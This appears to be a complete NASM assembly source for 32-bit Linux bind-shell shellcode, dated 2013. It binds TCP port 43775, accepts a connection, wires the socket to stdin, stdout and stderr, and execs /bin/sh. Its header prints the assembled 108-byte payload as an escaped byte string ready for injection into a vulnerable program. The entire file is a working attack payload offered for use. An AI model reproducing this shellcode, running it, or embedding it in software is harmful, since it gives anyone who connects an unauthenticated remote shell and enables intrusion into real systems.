;    This program is free software: you can redistribute it and/or modify
;    it under the terms of the GNU General Public License as published by
;    the Free Software Foundation, either version 3 of the License, or
;    (at your option) any later version.
;
;    This program is distributed in the hope that it will be useful,
;    but WITHOUT ANY WARRANTY; without even the implied warranty of
;    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;    GNU General Public License for more details.
;
;    You should have received a copy of the GNU General Public License
;    along with this program.  If not, see <http://www.gnu.org/licenses/>.

; Filename: shell_bind_tcp_smaller.nasm
; Author: Andrey Arapov <andrey.arapov@gmail.com>
; 2013 March
;
; DESC:
; Binds to a port 43775
; Execs Shell on incoming connection
;
;
; Shellcode size: 108 bytes
; Shellcode "\x31\xc0\xb0\x66\x31\xdb\x43\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xeb\x50\x5f\x6a\x66\x58\x43\x31\xd2\x52\x66\xff\x37\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\xe8\xab\xff\xff\xff\xaa\xff"
;
; Port is the last two bytes of the shellcode. In hex \xaa\xff  (0xaaff = 43775)
;
;

global _start

section .text

_start:
	xor eax, eax
	mov al, 102		; socketcall
	xor ebx, ebx
	inc ebx			; 1 = SYS_SOCKET socket()
	push BYTE 6		; IPPROTO_TCP	|| 	int protocol);
	push BYTE 1		; SOCK_STREAM	|| 	int type,
	push BYTE 2		; AF_INET	|| socket(int domain,
	mov ecx, esp		; ECX - PTR to arguments for socket()
	int 0x80
	mov esi, eax		; save socket fd in ESI for later


	jmp short call_get_port
port_in_esp:
	pop edi			; getting port address from ESP

	push BYTE 102
	pop eax			; socketcall
	inc ebx			; 2 = SYS_BIND bind()
	xor edx, edx
	push edx		; 0 = ANY HOST (0.0.0.0)}		||		struct in_addr sin_addr (unsigned long s_addr) };
	push WORD [edi]		; PORT specified in the bottom of the code / shellcode. Last two bytes in HEX.
	push WORD bx		; 2 = AF_INET				|| struct sockaddr { short sin_family,
	mov ecx, esp		; Save PTR to sockaddr struct in ECX
	push BYTE 16		; 	socklen_t addrlen);
	push ecx		; 	const struct sockaddr *addr,
	push esi		; bind(int sockfd,
	mov ecx, esp		; ECX = PTR to arguments for bind()
	int 0x80


	mov BYTE al, 102	; socketcall
	inc ebx
	inc ebx			; 4 = SYS_LISTEN listen()
	push BYTE 1		; 	int backlog);
	push esi		; listen(int sockfd,
	mov ecx, esp		; ECX = PTR to arguments for listen()
	int 0x80


	mov BYTE al, 102	; socketcall
	inc ebx			; 5 = SYS_ACCEPT = accept()
	push edx		; 	socklen_t *addrlen = 0);
	push edx		; 	struct sockaddr *addr = NULL,
	push esi		; listen(int sockfd,
	mov ecx, esp		; ECX = PTR to arguments for accept()
	int 0x80


	; dup2 to duplicate sockfd, that will attach the client to a shell
	; that we'll spawn below in execve syscall
	xchg eax, ebx		; after EBX = sockfd, EAX = 5
	push BYTE 2
	pop ecx
dup2_loop:
	mov BYTE al, 63
	int 0x80
	dec ecx
	jns dup2_loop


	; spawning as shell
	xor eax, eax
	push eax
	push 0x68732f6e		; '//bin/sh' in reverse
	push 0x69622f2f		; beginning of '//bin/sh' string is here
	mov ebx, esp
	push eax
	mov edx, esp		; ESP is now pointing to EDX
	push ebx
	mov ecx, esp
	mov al, 11		; execve
	int 0x80

call_get_port:
	call port_in_esp
	db 0xaa, 0xff		; BYTE (43775 in straight hex)

